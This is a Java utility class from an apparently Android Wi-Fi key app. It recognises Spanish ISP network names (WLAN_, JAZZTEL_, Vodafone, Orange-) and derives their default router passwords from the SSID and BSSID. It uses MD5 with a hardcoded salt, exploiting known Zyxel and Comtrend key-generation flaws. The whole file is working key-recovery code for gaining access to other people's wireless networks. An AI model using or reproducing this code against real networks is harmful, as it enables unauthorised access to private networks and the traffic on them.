package com.googlecode.wlandroid2;

import java.security.NoSuchAlgorithmException;

import clavewifi.md5sum.JavaMD5Sum;

public class Util {

	//test:  "WLAN_C34E";
    	//test: "34:94:1D:E4:D6:72";


	private Util() {
		
		
	}

	/**
	 * @param args
	 */
	public static boolean checkSSID(String ssid) {
		if (ssid !=null){
			return ssid.matches("((WLAN|JAZZTEL)_|Vodafone|Orange-)(\\w){4}");
					//return ssid.matches("WLAN_(\\w){4}")|| ssid.matches("JAZZTEL_(\\w){4}");
		}
		return false;

	}
	
	public static String getHeader(String ssid){
		return ssid.replaceAll("(WLAN|JAZZTEL)_|Vodafone|Orange-", "");
	}
	public static String calculateKey(String ssid, String bssid){
		if ( ssid.startsWith("WLAN_") && bssid.startsWith("00:1F:A4:"))
			return calculateKeyZyxel(ssid, bssid);
		else
			return calculateKeyComtrend(ssid, bssid);
	
	}
	
	private static String calculateKeyZyxel(String ssid, String bssid) {
		String result = null;
		bssid=bssid.replaceAll(":","").toLowerCase();
		String bssidp=bssid.substring(0, 8);
		ssid=ssid.toLowerCase();
		int end_cabecera=ssid.length();
		int start_cabecera=end_cabecera-4;
		String cabecera=ssid.toLowerCase().substring(start_cabecera, end_cabecera);
		String md5sum;
		
		try {
			md5sum = JavaMD5Sum.computeSum(bssidp + cabecera);
			result = md5sum.substring(0, 20).toUpperCase();
			
		}catch (NoSuchAlgorithmException ex) {
			
		}
		return result;
	}
	private static String calculateKeyComtrend(String ssid, String bssid) {
		String result = null;
		String cabecera = getHeader(ssid).toUpperCase();
		bssid = bssid.replaceAll(":","").toUpperCase();
		String bssidp = bssid.substring(0, 8);
		String md5sum;
				
		try {
			md5sum = JavaMD5Sum.computeSum("bcgbghgg" + bssidp + cabecera + bssid);
			result = md5sum.substring(0, 20).toLowerCase();
		} catch (NoSuchAlgorithmException ex) {
		
		}
		 
		return result;
	}
	

	public static String show(String ssid, String bssid, String key) {
		return show(ssid, bssid)+"-->key:"+key+"\n";
	}
	public static String show(String ssid, String bssid) {
		
		return ssid+" "+bssid.toUpperCase().replaceAll(":","")+"\n";
	}


}
